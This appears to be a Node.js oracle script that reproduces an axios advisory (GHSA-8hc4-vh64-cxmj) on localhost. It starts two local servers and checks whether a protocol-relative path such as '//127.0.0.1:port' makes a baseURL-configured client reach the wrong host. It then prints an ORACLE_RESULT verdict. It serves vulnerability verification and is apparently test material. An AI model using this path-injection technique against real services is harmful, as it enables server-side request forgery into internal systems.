let operation_completed = false;
let exploit_succeeded = false;
let evidence = '';

(async () => {
  let goodServer = null;
  let badServer = null;
  try {
    const http = require('node:http');
    const axiosMod = require('axios');
    const axios = axiosMod && axiosMod.default ? axiosMod.default : axiosMod;

    if (!axios || typeof axios.create !== 'function') {
      throw new Error('axios_api_unavailable');
    }

    const marker = 'ghsa-8hc4-vh64-cxmj-' + Date.now() + '-' + Math.random().toString(16).slice(2);

    const listen = (server) => new Promise((resolve, reject) => {
      server.listen(0, '127.0.0.1', () => resolve(server.address().port));
      server.once('error', reject);
    });

    goodServer = http.createServer((req, res) => {
      res.statusCode = 200;
      res.end('good:' + marker);
    });

    badServer = http.createServer((req, res) => {
      res.statusCode = 200;
      res.end('bad:' + marker);
    });

    const goodPort = await listen(goodServer);
    const badPort = await listen(badServer);

    const client = axios.create({
      baseURL: 'http://127.0.0.1:' + goodPort,
      timeout: 2000,
      validateStatus: () => true
    });

    const benignResp = await client.get('/ok');
    if (!benignResp || benignResp.data !== 'good:' + marker) {
      throw new Error('benign_request_unexpected_response');
    }

    operation_completed = true;

    const maliciousPath = '//127.0.0.1:' + badPort;
    let malResult = null;
    let malError = null;
    try {
      malResult = await client.get('/' + maliciousPath);
    } catch (e) {
      malError = e;
    }

    if (malResult && malResult.data === 'bad:' + marker) {
      exploit_succeeded = true;
    } else {
      exploit_succeeded = false;
    }

    evidence = JSON.stringify({
      marker,
      good_port: goodPort,
      bad_port: badPort,
      malicious_path: '/' + maliciousPath,
      malicious_status: malResult ? malResult.status : null,
      malicious_data: malResult ? String(malResult.data) : null,
      malicious_error: malError ? (malError.code || malError.name || 'error') : null
    });
  } catch (err) {
    operation_completed = false;
    exploit_succeeded = false;
    evidence = 'setup_or_benign_failed:' + (err && err.message ? err.message : String(err));
  } finally {
    const closeServer = (s) => new Promise((resolve) => {
      if (!s) return resolve();
      try { s.close(() => resolve()); } catch (_) { resolve(); }
    });
    await closeServer(goodServer);
    await closeServer(badServer);
    console.log('ORACLE_RESULT ' + JSON.stringify({ operation_completed, exploit_succeeded, evidence }));
  }
})();